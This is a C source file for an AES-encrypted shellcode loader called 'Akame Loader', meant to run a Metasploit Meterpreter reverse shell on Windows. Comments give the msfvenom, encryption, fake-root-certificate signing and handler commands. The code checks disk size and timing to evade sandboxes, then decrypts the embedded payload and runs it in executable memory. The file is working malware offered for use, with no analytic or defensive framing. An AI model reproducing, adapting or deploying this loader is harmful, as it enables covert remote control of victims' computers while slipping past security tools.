#include <windows.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

/* Command to generate a reverse shell with metasploit
* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shellcode.bin
*/

/* Command to encrypt shellcode.bin
* mv shellcode.bin \Akame Loader\x64\Release\Resources\
* cd \Akame Loader\x64\Release\Resources\
* (optional) encrypt --help
* encrypt.exe -l cpp -m shellcode.bin -e random -o cli
*/

/* Commands to add a certificate
* move Akame.exe Resources && cd Resources
* makecert.exe -r -pe -n "CN=Akame CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AkameCA.pvk AkameCA.cer
* certutil -user -addstore Root AkameCA.cer
* makecert.exe -pe -n "CN=Akame Cert" -a sha256 -cy end -sky signature -ic AkameCA.cer -iv AkameCA.pvk -sv AkameCert.pvk AkameCert.cer
* pvk2pfx.exe -pvk AkameCert.pvk -spc AkameCert.cer -pfx AkameCert.pfx
* signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe
*/

/* Command to listen to incomming connections with metasploit
* msfconsole -q
* set payload windows/x64/meterpreter/reverse_tcp
* use exploit/multi/handler
* (optional) show options
* set LHOST <IP>
* exploit
*/

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
	// Check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned, diskSizeGB;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 100) return 0;

	// Delay execution
	Sleep(10000);
	
	// Check if tickcount-related functions were manipulated by the sandbox
	ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
	LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
	ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
	DWORD time = GetTickCount64();
	DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
		((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
	if ((time - kernelTime) > 100 && (kernelTime - time) > 100) return 0;

	// Payload
	char iv[] = { 0xE0, 0xE9, 0x53, 0x30, 0x07, 0x75, 0x1A, 0x1A, 0xB3, 0xF6, 0x2E, 0x40, 0x2B, 0x87, 0x02, 0x39 };

	char key[] = { 0x50, 0x48, 0x68, 0x6B, 0x4A, 0x65, 0x74, 0x6E, 0x77, 0x76, 0x6C, 0x65, 0x52, 0x78, 0x73, 0x31, 0x4B, 0x77, 0x62, 0x78, 0x79, 0x6F, 0x32, 0x37, 0x50, 0x50, 0x7A, 0x45, 0x76, 0x48 };
    unsigned int keylen = sizeof key;

	unsigned char buff[] = { 0xF7, 0x4C, 0xD8, 0xDF, 0xD8, 0xE3, 0xE8, 0xD8, 0xC0, 0x5F, 0x07, 0xD5, 0xFC, 0x91, 0xD6, 0x24, 0x41, 0x6B, 0xDD, 0x48, 0xE2, 0x3C, 0x72, 0x89, 0x8A, 0xC4, 0xCB, 0xEA, 0xAA, 0x88, 0x9A, 0x1B, 0x94, 0xEE, 0x41, 0xB6, 0x9A, 0xEE, 0xB6, 0x34, 0xA0, 0x05, 0x9B, 0xBB, 0x21, 0x7B, 0x05, 0xE7, 0x1C, 0xEC, 0x85, 0x00, 0xDA, 0x6F, 0x38, 0x30, 0xF3, 0x29, 0xBE, 0x40, 0xC1, 0xA6, 0x64, 0x43, 0x5E, 0xA9, 0x67, 0xDA, 0x87, 0x45, 0xAF, 0xDD, 0xB7, 0x44, 0x7B, 0x89, 0x47, 0x5B, 0xA2, 0x40, 0x40, 0x62, 0xF7, 0xD5, 0x87, 0xC2, 0xF5, 0x6A, 0xA4, 0x1E, 0x3D, 0x59, 0x61, 0xC8, 0x37, 0x85, 0x0F, 0xE5, 0x03, 0xCC, 0xF2, 0x0C, 0x51, 0xAB, 0x21, 0x85, 0x4A, 0xB1, 0x77, 0x5E, 0x9C, 0xE4, 0xA2, 0x43, 0xD5, 0x21, 0x69, 0x81, 0x21, 0x81, 0xDB, 0xF6, 0xE3, 0xB1, 0x56, 0x59, 0xE3, 0xE7, 0xFE, 0xC9, 0x10, 0x23, 0xFF, 0x0A, 0x92, 0xA7, 0x37, 0xE7, 0x12, 0x8E, 0x57, 0x7D, 0xF6, 0xFB, 0x45, 0x62, 0xD0, 0x11, 0x59, 0xF8, 0x27, 0x06, 0xB2, 0x8B, 0xEC, 0x73, 0x9B, 0x90, 0xA8, 0x92, 0xF8, 0xD3, 0xF7, 0x31, 0x0B, 0xC8, 0xBC, 0xDB, 0xA4, 0x0C, 0xC7, 0xF5, 0x53, 0xFC, 0x70, 0x27, 0xF3, 0x28, 0x54, 0x02, 0x33, 0x68, 0xFD, 0x88, 0xF9, 0xBE, 0x40, 0x94, 0x0B, 0x04, 0xF5, 0x8D, 0x2F, 0x26, 0x29, 0xAC, 0x57, 0x78, 0x58, 0x82, 0xFA, 0xF4, 0xB2, 0xFB, 0xE6, 0x9B, 0x3B, 0x34, 0x07, 0x15, 0x3A, 0x4F, 0x9A, 0x95, 0x78, 0x5C, 0x4B, 0x9A, 0x81, 0xEC, 0x05, 0xA8, 0xCC, 0x2D, 0x4A, 0x50, 0x82, 0x92, 0xC8, 0x87, 0xC8, 0xDC, 0x4E, 0x12, 0x9B, 0xAE, 0x11, 0x33, 0xA0, 0x15, 0xC6, 0x25, 0xF7, 0x1D, 0x47, 0xA7, 0x4F, 0x38, 0xA7, 0xFD, 0xB6, 0x68, 0x0B, 0xB2, 0x65, 0xDA, 0x9A, 0xC8, 0x64, 0x33, 0xC3, 0x0D, 0xE5, 0xB3, 0xA2, 0xA8, 0x8F, 0x08, 0x1F, 0x66, 0x06, 0x84, 0xAC, 0xF5, 0xF2, 0xFE, 0xEA, 0x00, 0xA9, 0xAC, 0x56, 0x8F, 0xE5, 0xC3, 0xC8, 0x0A, 0xE3, 0x21, 0x14, 0xA1, 0x29, 0x63, 0x1E, 0xEA, 0xEB, 0xD1, 0x5E, 0x64, 0x9D, 0xF8, 0xC0, 0x75, 0xC8, 0x40, 0x06, 0x87, 0x5B, 0x71, 0x6D, 0x7F, 0x27, 0x9D, 0xAE, 0x50, 0x19, 0x9F, 0x98, 0x03, 0xF3, 0x97, 0x5C, 0x97, 0x38, 0x29, 0x66, 0x4B, 0xF4, 0xD9, 0xF9, 0x93, 0x0B, 0xC4, 0x5C, 0x25, 0xBD, 0x16, 0x04, 0xE9, 0x13, 0xB8, 0xBC, 0x65, 0x81, 0xF8, 0xD6, 0xB6, 0xF7, 0xD1, 0x24, 0xC2, 0x50, 0x66, 0x0D, 0xBE, 0xDC, 0xD2, 0x0F, 0x57, 0x61, 0x01, 0x96, 0x02, 0x10, 0xFF, 0xBC, 0x43, 0x99, 0xE8, 0xEB, 0xBD, 0xEE, 0x87, 0x8D, 0x8F, 0xCE, 0xD0, 0xD1, 0x0C, 0xA1, 0x21, 0x63, 0xE6, 0x0B, 0xF3, 0x9A, 0x0E, 0x13, 0xC5, 0x98, 0x9F, 0xDA, 0x48, 0x2C, 0x63, 0x66, 0xBD, 0x9F, 0x01, 0xA6, 0x93, 0x4D, 0x31, 0x83, 0xE9, 0xEF, 0xF9, 0xB0, 0x43, 0xC6, 0x8E, 0x36, 0xA5, 0x84, 0x80, 0x1D, 0x8E, 0x0B, 0x05, 0x23, 0x54, 0xD2, 0x4A, 0xAA, 0x5A, 0xA4, 0x8F, 0xBC, 0xC8, 0xBE, 0xEC, 0x1E, 0x88, 0x97, 0x4C, 0xFB, 0x9E, 0x71, 0x86, 0xA1, 0x3A, 0xC4, 0xD0, 0x30, 0x12, 0x75, 0x24, 0xB8, 0x9E, 0xE0, 0x30, 0xBF, 0x17, 0x47, 0xEC, 0x7D, 0xB1, 0x92, 0x3E, 0x43, 0x2B, 0x52, 0x4A, 0xA5, 0x72, 0x37, 0x88, 0x5E, 0xDE, 0x44, 0xF7, 0x2E, 0xE5, 0x61, 0x18, 0xD5, 0xF2, 0x16, 0xD1, 0x20, 0x8B, 0x7F, 0x15, 0x0A, 0xF4, 0xE6, 0x11, 0x85, 0x89, 0x47, 0x53, 0x4B, 0xB3, 0xDC, 0xCD, 0xB7, 0x7C, 0x1D, 0xED, 0x3D, 0x1A, 0xC0, 0xA9, 0x9B, 0xDE, 0x1B, 0x87, 0xEC, 0xE4, 0x6E, 0x7D, 0x0E, 0x76 };
	unsigned int bufflen = sizeof buff;

    // Allocate a memory buffer for the payload
    void* exec_mem = VirtualAlloc(0, bufflen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt the payload
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    DWORD mode = CRYPT_MODE_CBC;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, 0))
        return 0;

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
        return 0;

    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0))
        return 0;

    // SHA-256 hash the AES key
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey))
        return 0;

    // Set the mode to CBC
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0))
        return 0;

    // Set the custom AES initialization value
    if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0))
        return 0;

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, buff, (DWORD*)&bufflen))
        return 0;

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    // Copy the payload to a new buffer
    RtlMoveMemory(exec_mem, buff, bufflen);

    // Make the new buffer as executable
    DWORD oldprotect = 0;
    BOOL rv = VirtualProtect(exec_mem, bufflen, PAGE_EXECUTE_READ, &oldprotect);

    // Run the payload
    if (rv != 0) {
        HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
	
	return 0;
}